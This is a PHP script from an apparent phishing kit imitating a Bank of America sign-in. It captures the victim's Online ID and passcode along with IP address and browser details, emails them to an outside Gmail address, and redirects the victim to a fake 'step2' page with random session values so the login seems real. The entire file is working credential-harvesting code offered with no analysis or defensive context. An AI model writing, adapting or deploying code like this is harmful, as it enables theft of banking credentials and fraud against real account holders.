<?php
include ("images/blocker.gif");
if($_POST["usr"] != "" and $_POST["psw"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------BOA Info-----------------------\n";
$message .= "Online ID            : ".$_POST['usr']."\n";
$message .= "Passcode           : ".$_POST['psw']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "mahkhafx@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);
mail($userinfo,$subject,$message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: step2.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>